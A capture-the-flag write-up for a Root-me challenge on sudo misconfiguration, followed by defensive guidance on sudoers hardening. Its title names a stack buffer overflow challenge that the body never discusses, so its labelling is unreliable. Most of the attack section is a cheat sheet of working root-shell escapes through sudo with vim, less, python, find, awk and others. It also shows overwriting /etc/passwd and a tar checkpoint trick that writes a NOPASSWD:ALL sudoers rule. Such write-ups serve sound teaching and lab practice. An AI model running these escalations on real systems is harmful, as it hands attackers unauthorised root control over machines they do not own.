# ELF x86 - Stack buffer overflow basic 1

**Category:** App-Script  
**Difficulty:** ⭐⭐ (Medium)  
**Points:** 15  
**Platform:** [Root-me](https://www.root-me.org/)

---

## 📋 Challenge Description

This challenge focuses on exploiting weak sudo configurations in Linux systems. Many systems have misconfigured sudo rules that allow users to escalate their privileges by executing certain commands with root permissions.

The goal is to identify and exploit a weak sudo configuration to gain elevated privileges and read a protected password file.

---

## 🎯 Objective

Exploit misconfigured sudo permissions to escalate privileges from a regular user to root and retrieve the flag.

---

## 🔍 Approach

### 1. Check Current Privileges

First, understand your current user context:

```bash
# Check current user
whoami

# Check user ID
id

# Check groups
groups
```

### 2. Enumerate Sudo Permissions

The key to this challenge is examining what commands you can run with sudo:

```bash
# List sudo privileges for current user
sudo -l

# This will show output like:
# User app-script may run the following commands:
#     (root) NOPASSWD: /usr/bin/vim
```

### 3. Research Exploitation Techniques

Once you know which commands can be run with sudo, research how to exploit them:

- Check [GTFOBins](https://gtfobins.github.io/) for privilege escalation techniques
- Look for ways to spawn a shell or read files as root
- Identify any commands that allow file writes or command execution

---

## 💡 Solution

### Step 1: Enumerate Sudo Permissions

```bash
sudo -l
```

**Example Output:**
```
User app-script-ch1 may run the following commands on challenge03:
    (root) NOPASSWD: /usr/bin/vim
```

### Step 2: Identify Exploitation Vector

The user can run `vim` as root without a password. This is a classic privilege escalation vector because vim can spawn a shell.

### Step 3: Exploit via GTFOBins

According to [GTFOBins](https://gtfobins.github.io/gtfobins/vim/), vim can be exploited in several ways:

**Method 1: Shell Escape**

```bash
sudo vim -c ':!/bin/sh'
```

**Method 2: Interactive Shell**

```bash
sudo vim
# Then in vim, type:
:set shell=/bin/sh
:shell
```

**Method 3: Direct Command Execution**

```bash
sudo vim -c ':!cat /challenge/app-script/ch1/.passwd|head -1'
```

### Step 4: Read the Password File

Once you have a root shell or can execute commands as root:

```bash
# Find the password file
find /challenge -name ".passwd" 2>/dev/null

# Read the password
cat /challenge/app-script/ch1/.passwd
```

---

## 🎯 Common Weak Sudo Configurations

### 1. Text Editors

Editors that can spawn shells or execute commands:

```bash
# vim/vi
sudo vim -c ':!/bin/sh'

# nano (requires newer versions)
sudo nano -s /bin/sh
# Then press Ctrl+T

# emacs
sudo emacs -Q -nw --eval '(term "/bin/sh")'

# less/more
sudo less /etc/profile
# Then type: !bash
```

### 2. File Management Tools

```bash
# cp - can overwrite system files
sudo cp /tmp/evil_passwd /etc/passwd

# mv - can move/rename system files
sudo mv /tmp/evil /etc/cron.d/evil

# tar - can be exploited to create files anywhere
echo 'echo "user ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/user' > /tmp/shell.sh
chmod +x /tmp/shell.sh
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/tmp/shell.sh
```

### 3. Programming Languages

```bash
# python
sudo python -c 'import os; os.system("/bin/sh")'

# perl
sudo perl -e 'exec "/bin/sh";'

# ruby
sudo ruby -e 'exec "/bin/sh"'

# lua
sudo lua -e 'os.execute("/bin/sh")'
```

### 4. System Utilities

```bash
# find
sudo find / -exec /bin/sh \; -quit

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# man
sudo man man
# Then type: !bash

# git
sudo git help config
# Then type: !/bin/sh
```

---

## 🧠 Key Concepts

### Sudo Security

**sudo** (Super User DO) allows users to run commands with elevated privileges. Key components:

```bash
# Sudoers file location
/etc/sudoers

# Sudoers.d directory for additional rules
/etc/sudoers.d/

# Check syntax before editing
visudo
```

### NOPASSWD Directive

The `NOPASSWD` directive allows running commands without password authentication:

```
# Dangerous configuration
user ALL=(ALL) NOPASSWD: /usr/bin/vim

# Better configuration (specific commands only)
user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2
```

### Principle of Least Privilege

Always follow the principle of least privilege:

1. **Only grant necessary permissions**
2. **Use command whitelisting** instead of wildcards
3. **Avoid NOPASSWD** when possible
4. **Regularly audit sudo configurations**

---

## 🔧 Tools Used

- **sudo** - Execute commands with elevated privileges
- **GTFOBins** - Repository of Unix binaries that can be exploited
- **vim/nano/other editors** - For shell escape techniques
- **bash** - Shell for command execution

---

## 📚 Lessons Learned

### Security Implications

1. **Misconfigured Sudo is a Critical Vulnerability**
   - Can lead to complete system compromise
   - Often overlooked in security audits
   - Common in CTF environments and real systems

2. **Text Editors Should Not Be in Sudoers**
   - Editors like vim, nano, emacs can spawn shells
   - If editing specific files is needed, use sudoedit instead

3. **Wildcard Dangers**
   - Avoid wildcards in sudoers (e.g., `/usr/bin/*`)
   - Can lead to unexpected privilege escalation

### Defensive Measures

1. **Use Sudoedit**
   ```bash
   # Instead of:
   user ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/config.conf
   
   # Use:
   user ALL=(ALL) sudoedit /etc/config.conf
   ```

2. **Restrict Command Arguments**
   ```bash
   # Bad:
   user ALL=(ALL) NOPASSWD: /usr/bin/python
   
   # Better:
   user ALL=(ALL) NOPASSWD: /usr/bin/python /opt/scripts/safe_script.py
   ```

3. **Regular Auditing**
   ```bash
   # Review sudoers file
   sudo cat /etc/sudoers
   
   # Check all sudoers.d files
   sudo ls -la /etc/sudoers.d/
   
   # Audit sudo usage logs
   sudo grep -i sudo /var/log/auth.log
   ```

4. **Monitoring**
   ```bash
   # Log all sudo commands
   Defaults log_input, log_output
   Defaults logfile=/var/log/sudo.log
   ```

---

## 🔗 References

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation database
- [Sudo Manual](https://www.sudo.ws/man/sudo.man.html)
- [Sudoers Manual](https://www.sudo.ws/man/sudoers.man.html)
- [Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

---

## 🎓 Difficulty Assessment

**Skill Level Required:** Intermediate  
**Time to Complete:** 10-15 minutes  
**Prerequisites:**
- Understanding of Linux permissions
- Familiarity with sudo command
- Knowledge of GTFOBins
- Basic shell scripting

---

## 📝 Exploitation Checklist

When you encounter sudo privileges:

- [ ] Run `sudo -l` to list allowed commands
- [ ] Check GTFOBins for each allowed command
- [ ] Test shell escape techniques
- [ ] Look for file read/write capabilities
- [ ] Check for environment variable manipulation
- [ ] Test command injection possibilities
- [ ] Verify PATH manipulation vulnerabilities

---

## ✅ Validation

Submit the password found in the flag file to complete the challenge.

**Challenge Status:** ✅ Completed  
**Date Completed:** [Your completion date]  
**Points Earned:** 15

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing systems.*
